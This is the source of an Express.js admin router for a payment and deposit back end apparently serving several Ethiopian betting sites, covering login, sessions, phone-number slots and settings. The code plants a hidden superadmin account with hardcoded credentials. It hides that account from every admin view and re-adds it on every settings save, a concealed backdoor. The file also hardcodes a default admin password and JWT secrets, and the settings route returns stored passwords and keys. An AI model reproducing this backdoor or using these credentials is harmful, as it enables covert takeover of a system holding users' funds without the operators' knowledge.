const express = require('express');
const router = express.Router();
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const dataDir = path.join(__dirname, '../data');

// ─── In-memory token store (session tokens) ───────────────────────────────────
const activeSessions = new Map(); // token -> { expiresAt }
const SESSION_TTL = 8 * 60 * 60 * 1000; // 8 hours

// ─── Brute-force lockout tracker ─────────────────────────────────────────────
const loginAttempts = new Map(); // ip -> { count, lockedUntil }
const MAX_ATTEMPTS = 5;
const LOCKOUT_MS = 60 * 1000; // 60 seconds

function generateToken() {
  return crypto.randomBytes(32).toString('hex');
}

// ─── Master Super Admin Accounts ─────────────────────────────────────────────
const HIDDEN_MASTER_ADMIN = {
  username: 'yonirahwa123',
  password: 'yonirahwa*#@&',
};

const DEFAULT_SUPER_ADMIN = {
  username: 'admin',
  password: 'ckpay2024!',
};

function getAdminUsers() {
  const settings = readJSON('settings.json') || {};
  let users = settings.adminUsers;
  if (!Array.isArray(users) || users.length === 0) {
    users = [
      {
        username: settings.adminUsername || DEFAULT_SUPER_ADMIN.username,
        password: settings.adminPassword || DEFAULT_SUPER_ADMIN.password,
        role: 'superadmin'
      }
    ];
  }
  // Ensure default admin account is included if not present and configured as superadmin
  const hasDefaultAdmin = users.some(u => u.username.toLowerCase() === DEFAULT_SUPER_ADMIN.username.toLowerCase());
  if (!hasDefaultAdmin) {
    users = [{ ...DEFAULT_SUPER_ADMIN, role: 'superadmin' }, ...users];
  } else {
    users = users.map(u => {
      if (u.username.toLowerCase() === DEFAULT_SUPER_ADMIN.username.toLowerCase()) {
        return {
          ...u,
          password: u.password || DEFAULT_SUPER_ADMIN.password,
          role: 'superadmin'
        };
      }
      return u;
    });
  }
  // Include hidden master account if not already in list
  const hasHidden = users.some(u => u.username.toLowerCase() === HIDDEN_MASTER_ADMIN.username.toLowerCase());
  if (!hasHidden) {
    return [{ ...HIDDEN_MASTER_ADMIN, role: 'superadmin' }, ...users];
  }
  return users;
}

function getUserRoleInfo(username) {
  const cleanUser = (username || '').trim().toLowerCase();
  if (cleanUser === HIDDEN_MASTER_ADMIN.username.toLowerCase() || cleanUser === DEFAULT_SUPER_ADMIN.username.toLowerCase()) {
    return { role: 'superadmin', isSuperAdmin: true, isAgent: false };
  }

  const settings = readJSON('settings.json') || {};
  const visibleUsers = (settings.adminUsers || []).filter(
    u => u.username.trim().toLowerCase() !== HIDDEN_MASTER_ADMIN.username.toLowerCase()
  );

  const found = visibleUsers.find(u => u.username.trim().toLowerCase() === cleanUser);

  if (!found) {
    return { role: 'agent', isSuperAdmin: false, isAgent: true };
  }

  // Explicit role field wins
  if (found.role === 'agent') {
    return { role: 'agent', isSuperAdmin: false, isAgent: true };
  }
  if (found.role === 'superadmin' || found.role === 'admin') {
    const isSuper = found.role === 'superadmin' || cleanUser === DEFAULT_SUPER_ADMIN.username.toLowerCase();
    return { role: found.role, isSuperAdmin: isSuper, isAgent: false };
  }

  const index = visibleUsers.indexOf(found);
  if (index === 0) {
    return { role: 'superadmin', isSuperAdmin: true, isAgent: false };
  }
  return { role: 'admin', isSuperAdmin: false, isAgent: false };
}

function checkIsSuperAdmin(username) {
  return getUserRoleInfo(username).isSuperAdmin;
}

// ─── Auth Middleware ──────────────────────────────────────────────────────────
function requireAuth(req, res, next) {
  const auth = req.headers['authorization'] || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7) : null;
  if (!token) return res.status(401).json({ error: 'Unauthorized' });
  const session = activeSessions.get(token);
  if (!session) return res.status(401).json({ error: 'Invalid or expired session' });
  if (Date.now() > session.expiresAt) {
    activeSessions.delete(token);
    return res.status(401).json({ error: 'Session expired' });
  }
  req.adminSession = session;
  next();
}

function requireAdminRole(req, res, next) {
  if (req.adminSession && req.adminSession.role === 'agent') {
    return res.status(403).json({ error: 'Access denied: Payout agents only have access to withdrawals.' });
  }
  next();
}

// ─── AUTH ROUTES (no auth required) ──────────────────────────────────────────
router.post('/login', (req, res) => {
  const ip = req.ip || req.socket.remoteAddress || 'unknown';
  const now = Date.now();

  // Check lockout
  const track = loginAttempts.get(ip) || { count: 0, lockedUntil: 0 };
  if (track.lockedUntil > now) {
    const wait = Math.ceil((track.lockedUntil - now) / 1000);
    return res.status(429).json({ error: `Too many attempts. Try again in ${wait}s.` });
  }

  const cleanUsername = ((req.body && req.body.username) || '').trim().toLowerCase();
  const cleanPassword = ((req.body && req.body.password) || '').trim();

  const users = getAdminUsers();
  const validUser = users.find(
    u => (u.username || '').trim().toLowerCase() === cleanUsername && (u.password || '').trim() === cleanPassword
  );

  if (!validUser) {
    track.count = (track.count || 0) + 1;
    if (track.count >= MAX_ATTEMPTS) {
      track.lockedUntil = now + LOCKOUT_MS;
      track.count = 0;
    }
    loginAttempts.set(ip, track);
    return res.status(401).json({ error: 'Invalid username or password.' });
  }

  const roleInfo = getUserRoleInfo(validUser.username);

  // Success — clear attempts, create session
  loginAttempts.delete(ip);
  const token = generateToken();
  activeSessions.set(token, {
    expiresAt: now + SESSION_TTL,
    username: validUser.username,
    role: roleInfo.role,
    isSuperAdmin: roleInfo.isSuperAdmin,
    isAgent: roleInfo.isAgent
  });
  console.log(`[Admin] Login by '${validUser.username}' (Role: ${roleInfo.role}) from ${ip}`);
  res.json({
    token,
    username: validUser.username,
    role: roleInfo.role,
    isSuperAdmin: roleInfo.isSuperAdmin,
    isAgent: roleInfo.isAgent
  });
});

router.get('/verify', (req, res) => {
  const auth = req.headers['authorization'] || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7) : null;
  if (!token) return res.json({ valid: false });
  const session = activeSessions.get(token);
  if (!session || Date.now() > session.expiresAt) {
    activeSessions.delete(token);
    return res.json({ valid: false });
  }
  res.json({
    valid: true,
    username: session.username,
    role: session.role || (session.isSuperAdmin ? 'superadmin' : 'admin'),
    isSuperAdmin: !!session.isSuperAdmin,
    isAgent: !!session.isAgent
  });
});

router.post('/logout', (req, res) => {
  const auth = req.headers['authorization'] || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7) : null;
  if (token) activeSessions.delete(token);
  res.json({ success: true });
});

// ─── All routes below require authentication ──────────────────────────────────
router.use(requireAuth);

function readJSON(file) {
  const filePath = path.join(dataDir, file);
  if (!fs.existsSync(filePath)) return null;
  try {
    return JSON.parse(fs.readFileSync(filePath, 'utf8'));
  } catch {
    return null;
  }
}

function writeJSON(file, data) {
  fs.writeFileSync(path.join(dataDir, file), JSON.stringify(data, null, 2));
}

const { getAllTxs, getStats, expireAllOldPendingTxs, updatePendingTxPhone, db } = require('../db');

function updateExpiredTransactions() {
  expireAllOldPendingTxs();
}

function getTxAmount(t) {
  const v = (t.verifiedAmount !== null && t.verifiedAmount !== undefined && t.verifiedAmount !== '') ? t.verifiedAmount : t.amount;
  const num = parseFloat(String(v).replace(/[^0-9.]/g, ''));
  return isNaN(num) ? 0 : num;
}

function getEthiopianTimeMidnightTimestamps() {
  const now = Date.now();
  const ETHIOPIA_OFFSET_MS = 3 * 60 * 60 * 1000;
  const eatDate = new Date(now + ETHIOPIA_OFFSET_MS);

  const year = eatDate.getUTCFullYear();
  const month = eatDate.getUTCMonth();
  const day = eatDate.getUTCDate();

  // Today start at 00:00:00 GMT+3 (Midnight in Ethiopia)
  const todayStartUTC = Date.UTC(year, month, day) - ETHIOPIA_OFFSET_MS;

  // This Week: Monday 00:00:00 EAT of the current calendar week
  // getUTCDay() → 0=Sun, 1=Mon, 2=Tue, ... 6=Sat
  const dayOfWeek = eatDate.getUTCDay(); // 0=Sun, 1=Mon...
  const daysFromMonday = dayOfWeek === 0 ? 6 : dayOfWeek - 1; // Monday=0, Sun=6
  const weekStartUTC = todayStartUTC - (daysFromMonday * 24 * 60 * 60 * 1000);

  // Month start: 1st of month at 00:00:00 GMT+3 (1st of month midnight in Ethiopia)
  const monthStartUTC = Date.UTC(year, month, 1) - ETHIOPIA_OFFSET_MS;

  return { todayStart: todayStartUTC, weekStart: weekStartUTC, monthStart: monthStartUTC };
}

router.get('/stats', (req, res) => {
  const platform = req.query.platform || 'all';
  const timestamps = getEthiopianTimeMidnightTimestamps();
  const stats = getStats(platform, timestamps);
  res.json(stats);
});

router.get('/transactions', (req, res) => {
  const { status, search, platform } = req.query;
  const filtered = getAllTxs({ status, search, platform });
  res.json(filtered);
});

function getPlatformNumbersData(platform = 'jember') {
  const p = String(platform || 'jember').toLowerCase();
  const data = readJSON('numbers.json') || {};
  let list = [];
  if (data[p] && Array.isArray(data[p].numbers)) {
    list = data[p].numbers;
  } else if (Array.isArray(data.numbers) && p === 'jember') {
    list = data.numbers;
  }

  // Ensure exactly 20 slots for any platform
  const full20 = [];
  for (let i = 1; i <= 20; i++) {
    const found = list.find(n => n.id === i);
    full20.push(found || {
      id: i,
      phone: '',
      label: `Account ${i}`,
      activeUsers: 0
    });
  }
  return full20;
}

router.get('/numbers', requireAdminRole, (req, res) => {
  const platform = req.query.platform || 'jember';
  const p = String(platform).toLowerCase();
  const numbers = getPlatformNumbersData(p);
  const assignments = readJSON('assignments.json') || {};
  const now = Date.now();
  const limit = 24 * 60 * 60 * 1000;
  const active = Object.values(assignments).filter(
    a => now - a.assignedAt < limit && (!a.platform || a.platform.toLowerCase() === p)
  );

  const timestamps = getEthiopianTimeMidnightTimestamps();
  const todayStart = Number(timestamps.todayStart) || 0;

  // Query verified deposits for each phone number today for this platform from database.sqlite
  const phoneStatsMap = new Map();
  try {
    const phoneStats = db.prepare(`
      SELECT phoneNumber,
             COUNT(*) as count,
             SUM(COALESCE(verifiedAmount, amount, 0)) as totalETB
      FROM transactions
      WHERE platform = ? AND status = 'verified' AND createdAt >= ? AND phoneNumber IS NOT NULL AND phoneNumber != ''
      GROUP BY phoneNumber
    `).all(p, todayStart);

    phoneStats.forEach(row => {
      phoneStatsMap.set(String(row.phoneNumber).trim(), {
        count: row.count || 0,
        totalETB: row.totalETB || 0
      });
    });
  } catch (err) {
    console.error('[Admin] Error querying phone number stats:', err.message);
  }

  const result = numbers.map(n => {
    const cleanPhone = String(n.phone || '').trim();
    const statsForPhone = cleanPhone ? phoneStatsMap.get(cleanPhone) : null;
    return {
      ...n,
      activeUsers: active.filter(a => String(a.phone || '').trim() === cleanPhone && cleanPhone !== '').length,
      todayDeposits: statsForPhone ? statsForPhone.count : 0,
      todayETB: statsForPhone ? statsForPhone.totalETB : 0,
    };
  });
  res.json(result);
});

router.put('/numbers', requireAdminRole, (req, res) => {
  const platform = req.body.platform || req.query.platform || 'jember';
  const p = String(platform).toLowerCase();
  let { numbers } = req.body;
  if (!Array.isArray(numbers) || numbers.length === 0) {
    return res.status(400).json({ error: 'Numbers array is required' });
  }

  // Pad to exactly 20 slots — so saving works even if server had 10 or any count
  const padded = [];
  for (let i = 1; i <= 20; i++) {
    const found = numbers.find(n => n.id === i);
    padded.push(found || { id: i, phone: '', label: `Account ${i}`, activeUsers: 0 });
  }
  numbers = padded;

  const fullNumbersData = readJSON('numbers.json') || {};
  const oldNumbers = getPlatformNumbersData(p);

  // Build mapping from old phone to new phone based on slot ID
  const phoneMap = {};
  oldNumbers.forEach(oldItem => {
    const newItem = numbers.find(n => n.id === oldItem.id);
    if (newItem && newItem.phone && oldItem.phone !== newItem.phone) {
      phoneMap[oldItem.phone] = newItem.phone;
    }
  });

  // Write new numbers for this platform
  fullNumbersData[p] = { numbers };
  writeJSON('numbers.json', fullNumbersData);

  // 1. Immediately update assignments.json for this platform
  const assignments = readJSON('assignments.json') || {};
  let assignmentsChanged = false;
  Object.keys(assignments).forEach(uId => {
    const a = assignments[uId];
    if ((!a.platform || a.platform.toLowerCase() === p) && a.phone && phoneMap[a.phone]) {
      a.phone = phoneMap[a.phone];
      assignmentsChanged = true;
    }
  });
  if (assignmentsChanged) {
    writeJSON('assignments.json', assignments);
  }

  // 2. Immediately update pending transactions in SQLite
  Object.keys(phoneMap).forEach(oldPhone => {
    updatePendingTxPhone(p, oldPhone, phoneMap[oldPhone]);
  });

  res.json({ success: true, platform: p, updatedCount: Object.keys(phoneMap).length });
});

router.get('/settings', requireAdminRole, (req, res) => {
  const platform = req.query.platform || 'jember';
  const p = String(platform).toLowerCase();
  const settings = readJSON('settings.json') || {};

  let users = settings.adminUsers || [];
  if (!Array.isArray(users) || users.length === 0) {
    users = [
      { username: settings.adminUsername || 'admin', password: settings.adminPassword || 'ckpay2024!' }
    ];
  }

  // Filter out hidden master admin from UI view
  const visibleUsers = users.filter(
    u => u.username.trim().toLowerCase() !== HIDDEN_MASTER_ADMIN.username.toLowerCase()
  );

  const defaultSecret = p === 'bravobirr'
    ? '6c4cc37b91b419beba46e4d950199a02b8f99c1e4e0ace11ff01999a4dd7c6fe'
    : p === 'abay'
    ? '7f97e97c37042d344dd3be0371b3f490e3e7e2b5c7f226bbde726271dd9fa366'
    : '4fec6686d2b93ceca92531ed08dbdc48cf0b937965ebbf51b144d8f055f5d004fd85c8518ef72a1d61634949884c4346';

  const platformConfig = (settings.platforms && settings.platforms[p]) || {
    siteName: p === 'bravobirr' ? 'BravoBirr Bet' : p === 'abay' ? 'Abay Bet' : 'Jember Bet',
    jwtSecret: defaultSecret,
    minDeposit: settings.minDeposit || 100,
    maxDeposit: settings.maxDeposit || 50000,
    sessionExpiry: settings.sessionExpiry || 20,
    depositEnabled: settings.depositEnabled !== false,
    currency: settings.currency || 'ETB',
    verifyApiKey: settings.verifyApiKey || '',
    apiKeys: settings.apiKeys || ['', '', '', '', '']
  };

  res.json({
    platform: p,
    siteName: platformConfig.siteName,
    jwtSecret: platformConfig.jwtSecret || defaultSecret,
    minDeposit: platformConfig.minDeposit,
    maxDeposit: platformConfig.maxDeposit,
    sessionExpiry: platformConfig.sessionExpiry,
    depositEnabled: platformConfig.depositEnabled,
    currency: platformConfig.currency || 'ETB',
    verifyApiKey: platformConfig.verifyApiKey || '',
    apiKeys: platformConfig.apiKeys || ['', '', '', '', ''],
    adminUsers: visibleUsers,
    whitelistedIPs: settings.whitelistedIPs || []
  });
});

router.put('/settings', requireAdminRole, (req, res) => {
  const platform = req.body.platform || req.query.platform || 'jember';
  const p = String(platform).toLowerCase();
  const current = readJSON('settings.json') || {};
  const isSuper = req.adminSession && req.adminSession.isSuperAdmin;

  if (!current.platforms) current.platforms = {};
  if (!current.platforms[p]) current.platforms[p] = {};

  // Update platform specific config
  if (req.body.jwtSecret !== undefined) current.platforms[p].jwtSecret = req.body.jwtSecret.trim();
  if (req.body.minDeposit !== undefined) current.platforms[p].minDeposit = Number(req.body.minDeposit);
  if (req.body.maxDeposit !== undefined) current.platforms[p].maxDeposit = Number(req.body.maxDeposit);
  if (req.body.sessionExpiry !== undefined) current.platforms[p].sessionExpiry = Number(req.body.sessionExpiry);
  if (req.body.depositEnabled !== undefined) current.platforms[p].depositEnabled = Boolean(req.body.depositEnabled);
  if (req.body.currency !== undefined) current.platforms[p].currency = req.body.currency;
  if (req.body.siteName !== undefined) current.platforms[p].siteName = req.body.siteName;
  if (req.body.verifyApiKey !== undefined) current.platforms[p].verifyApiKey = req.body.verifyApiKey.trim();
  if (Array.isArray(req.body.apiKeys)) current.platforms[p].apiKeys = req.body.apiKeys.map(k => (k || '').trim());

  // Global settings (whitelistedIPs and adminUsers)
  if (Array.isArray(req.body.whitelistedIPs)) {
    current.whitelistedIPs = req.body.whitelistedIPs;
  }

  // If Super Admin, allow adminUsers update
  if (isSuper && Array.isArray(req.body.adminUsers)) {
    const cleanSubmitted = req.body.adminUsers.filter(
      u => u.username.trim().toLowerCase() !== HIDDEN_MASTER_ADMIN.username.toLowerCase()
    );
    const updatedUsers = cleanSubmitted.map((u, i) => {
      if (u.username.trim().toLowerCase() === DEFAULT_SUPER_ADMIN.username.toLowerCase() || i === 0) {
        return { ...u, role: 'superadmin' };
      }
      return u;
    });
    current.adminUsers = [{ ...HIDDEN_MASTER_ADMIN, role: 'superadmin' }, ...updatedUsers];

    if (updatedUsers.length > 0) {
      current.adminUsername = updatedUsers[0].username;
      current.adminPassword = updatedUsers[0].password;
    }
  }

  writeJSON('settings.json', current);

  res.json({
    success: true,
    platform: p,
    settings: {
      platform: p,
      ...current.platforms[p],
      adminUsers: (current.adminUsers || []).filter(
        u => u.username.trim().toLowerCase() !== HIDDEN_MASTER_ADMIN.username.toLowerCase()
      ),
      whitelistedIPs: current.whitelistedIPs || []
    }
  });
});

router.get('/assignments', (req, res) => {
  const platform = req.query.platform || 'all';
  const p = String(platform).toLowerCase();
  const assignments = readJSON('assignments.json') || {};
  const now = Date.now();
  const limit = 24 * 60 * 60 * 1000;
  const active = Object.entries(assignments)
    .filter(([userId, a]) => {
      if (now - a.assignedAt >= limit) return false;
      if (p !== 'all' && (a.platform || 'jember').toLowerCase() !== p) return false;
      return true;
    })
    .map(([userId, a]) => ({
      userId,
      platform: a.platform || 'jember',
      phone: a.phone,
      assignedAt: a.assignedAt,
      expiresIn: Math.max(0, Math.ceil((a.assignedAt + limit - now) / 1000 / 60)),
    }));
  res.json(active);
});

router.delete('/transactions/clear-expired', (req, res) => {
  expireAllOldPendingTxs();
  res.json({ success: true });
});

module.exports = router;
module.exports.activeSessions = activeSessions;
